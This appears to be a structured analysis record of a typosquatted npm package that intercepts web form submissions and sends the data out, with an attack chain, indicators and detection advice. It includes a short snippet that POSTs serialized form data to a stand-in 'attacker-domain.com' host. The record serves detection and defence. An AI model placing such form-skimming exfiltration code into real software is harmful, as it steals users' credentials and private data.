package_info.why_malicious: The package contains obfuscated JavaScript code that intercepts and serializes form data from all embedded forms, including sensitive sign-in forms, and exfiltrates this data to attacker-controlled domains via HTTP POST requests. The package was distributed through typosquatting, targeting developers searching for popular packages, and has been downloaded over 17,000 times, indicating a high risk of widespread compromise.

execution_context.trigger: runtime (when a form is submitted or interacted with in the app/website)
execution_context.file_location: main package JavaScript file (e.g., index.js or main.js within the npm package)

malicious_snippets.code_snippet:
var data = JSON.stringify(getFormData());
fetch('https://attacker-domain.com/collect', { method: 'POST', body: data });
malicious_snippets.code_behavior: Serializes form data from the DOM and sends it via HTTP POST to an attacker-controlled domain.

malice_analysis.why_suspicious: The code programmatically collects user input from forms and transmits it to an external, attacker-controlled domain without user knowledge or consent. The use of obfuscated code further conceals its true intent.
malice_analysis.violated_expectations: Legitimate npm packages should not access or exfiltrate user form data, especially not to untrusted or unknown domains, and should not use obfuscation to hide such behavior.
malice_analysis.similar_legitimate_use: Some analytics or telemetry libraries may collect limited usage data, but they are transparent about the data collected, the endpoints used, and do not obfuscate their code or target sensitive form data.
key_indicators: Obfuscated or minified JavaScript accessing form data
Network requests to non-standard or attacker-controlled domains
No user notification or consent for data exfiltration
Direct serialization and transmission of form data

execution_context.trigger: import-time (when the package is loaded by the application)
execution_context.file_location: main entry point of the npm package

malicious_snippets.code_behavior: Hooks into all form submissions on the page, serializes the form data, and sends it to a malicious domain.

malice_analysis.why_suspicious: The code globally attaches event listeners to all forms on the page and intercepts every form submission, capturing and exfiltrating potentially sensitive user data to an external, attacker-controlled endpoint.
malice_analysis.violated_expectations: Normal packages should not globally hook into form submissions or send sensitive data to unknown or untrusted endpoints, especially without user awareness or configuration.
malice_analysis.similar_legitimate_use: Legitimate form analytics or A/B testing tools may hook into forms, but they use trusted, well-documented domains and provide clear user-facing configuration and opt-in mechanisms.
key_indicators: Global event listeners attached to all forms
Automatic serialization and exfiltration of form data
Network requests to attacker-controlled or suspicious domains
No user-facing configuration, opt-in, or transparency

attack_chain.action: Developer installs the malicious npm package (icon-package) via typosquatting, mistaking it for a legitimate dependency.
attack_chain.leads_to: Malicious code is included in the application or website, enabling further compromise.

attack_chain.action: Malicious code executes at import-time or runtime, globally hooking into form submissions and monitoring user interactions.
attack_chain.leads_to: Form data is intercepted whenever a user submits a form, regardless of form purpose or sensitivity.

attack_chain.action: Intercepted form data is serialized and exfiltrated to attacker-controlled domains via HTTP POST requests.
attack_chain.leads_to: Attacker receives sensitive user data, including credentials and other confidential information submitted via forms.

behavioral_signatures: JavaScript code that attaches global event listeners to all form elements
Obfuscated or minified code that accesses and serializes form data
Network requests initiated on form submission to non-standard or untrusted domains
Lack of user notification or opt-in for data collection
file_indicators: Presence of suspicious npm packages (e.g., icon-package, ajax-libs, umbrellaks, ajax-library) in dependencies
Obfuscated or minified JavaScript files within node_modules directories
Unexpected modifications to main entry point files (e.g., index.js, main.js) in installed packages
network_indicators: Outbound HTTP POST requests to domains not associated with the application, such as attacker-controlled endpoints (e.g., attacker-domain.com, malicious-domain.com)
Consistent use of similar domain naming patterns across multiple suspicious packages
Network activity triggered specifically by form submission events
detection_knowledge.how_to_detect: Monitor for npm packages with names similar to popular libraries (typosquatting). Analyze JavaScript code in dependencies for obfuscated logic that accesses and serializes form data, especially in main entry point files. Use network monitoring to detect unexpected POST requests to unknown or suspicious domains, particularly those triggered by form submissions. Flag packages that globally hook into form events without user-facing configuration or transparency.
